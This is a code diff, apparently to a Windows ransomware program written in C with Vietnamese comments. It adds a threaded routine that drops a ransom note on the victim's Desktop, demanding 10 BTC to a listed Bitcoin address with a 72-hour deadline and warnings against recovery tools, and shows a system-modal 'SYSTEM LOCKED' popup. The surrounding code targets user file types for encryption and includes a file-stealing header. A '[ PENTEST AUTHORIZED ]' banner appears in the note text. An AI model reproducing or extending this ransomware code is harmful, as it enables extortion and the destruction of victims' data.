@@ -7,6 +7,7 @@
 #include <stdbool.h>
 #include "crypto.h"
 #include "file_steal.h"
+#pragma comment(lib, "user32.lib")
 #pragma comment(lib, "advapi32.lib")
 
 char queue[8192][260];
@@ -26,6 +27,83 @@ const char* userExtensions[] = {
     ".iso", ".vmdk", ".vdi", ".vhd",
     ".pst", ".ost", ".msg", ".eml"
 };
+DWORD WINAPI ShowRansomPopupThread(LPVOID lpParam) {
+    // Đợi 2 giây để encryption hoàn tất và file được flush
+    Sleep(2000);
+
+    // --- TẠO FILE DESCRIPTION.TXT ---
+    char desktopPath[MAX_PATH];
+    char descPath[MAX_PATH];
+    HANDLE hDesc;
+    DWORD written;
+
+    GetEnvironmentVariableA("USERPROFILE", desktopPath, MAX_PATH);
+    strcat(desktopPath, "\\Desktop");
+
+    _snprintf(descPath, MAX_PATH, "%s\\description.txt", desktopPath);
+
+    const char* descMsg =
+        "============================================\r\n"
+        "   === YOUR FILES HAVE BEEN ENCRYPTED ===\r\n"
+        "============================================\r\n"
+        "\r\n"
+        "What happened?\r\n"
+        "All your important documents, photos, databases,\r\n"
+        "and personal files have been encrypted with AES-128.\r\n"
+        "They are now UNREADABLE without the decryption key.\r\n"
+        "\r\n"
+        "How to recover your files?\r\n"
+        "You must pay a ransom of 10 BTC to the following address:\r\n"
+        "   1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\r\n"
+        "\r\n"
+        "After payment, please contact us at:\r\n"
+        "   pwned@tool.com\r\n"
+        "\r\n"
+        "In your email, include your Personal ID (located in the file\r\n"
+        "DECRYPT_INSTRUCTIONS.txt on your Desktop).\r\n"
+        "\r\n"
+        "WARNING:\r\n"
+        " - DO NOT attempt to decrypt files yourself\r\n"
+        " - DO NOT use third-party recovery tools\r\n"
+        " - DO NOT rename or modify encrypted files\r\n"
+        " - Any of these actions may result in PERMANENT data loss\r\n"
+        "\r\n"
+        "You have 72 hours to make the payment.\r\n"
+        "After that, the decryption key will be permanently destroyed.\r\n"
+        "\r\n"
+        "============================================\r\n"
+        "           [ PENTEST AUTHORIZED ]\r\n"
+        "============================================\r\n";
+
+    hDesc = CreateFileA(descPath, GENERIC_WRITE, 0, NULL,
+                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hDesc != INVALID_HANDLE_VALUE) {
+        WriteFile(hDesc, descMsg, strlen(descMsg), &written, NULL);
+        CloseHandle(hDesc);
+        printf("[OK] Created description.txt\n");
+    } else {
+        printf("[!] Failed to create description.txt (error %d)\n", GetLastError());
+    }
+
+    // --- POPUP MESSAGE BOX ---
+    MessageBoxA(
+        NULL,
+        "YOUR FILES HAVE BEEN ENCRYPTED!\r\n\r\n"
+        "All your documents, photos, databases and other important files\r\n"
+        "have been encrypted.\r\n\r\n"
+        "To recover your files, you must pay 10 BTC.\r\n\r\n"
+        "See:\r\n"
+        "  - DECRYPT_INSTRUCTIONS.txt (on Desktop)\r\n"
+        "  - description.txt (on Desktop)\r\n"
+        "for complete payment instructions.\r\n\r\n"
+        "DO NOT attempt to decrypt files yourself!",
+        "!!! SYSTEM LOCKED !!!",
+        MB_OK | MB_ICONERROR |
+        MB_SYSTEMMODAL | MB_TOPMOST | MB_SETFOREGROUND
+    );
+
+    return 0;
+}
 
 int isUserDataFile(const char* path) {
     const char* ext = strrchr(path, '.');
@@ -179,16 +257,8 @@ void FileScan(bool decryptMode) {
             CloseHandle(hNote);
         }
 
-        MessageBoxA(
-            NULL,
-            "YOUR FILES HAVE BEEN ENCRYPTED!\r\n\r\n"
-            "All your documents, photos, databases and other important files\r\n"
-            "have been encrypted.\r\n\r\n"
-            "To recover your files, you must pay 10 BTC.\r\n\r\n"
-            "See DECRYPT_INSTRUCTIONS.txt on your Desktop for details.",
-            "!!! SYSTEM LOCKED !!!",
-            MB_OK | MB_ICONERROR | MB_SYSTEMMODAL | MB_TOPMOST | MB_SETFOREGROUND
-        );
+        // THAY MessageBox trực tiếp = CreateThread gọi hàm popup riêng
+        CreateThread(NULL, 0, ShowRansomPopupThread, NULL, 0, NULL);
     } else {
         printf("Decrypt file successfully!\n");
     }
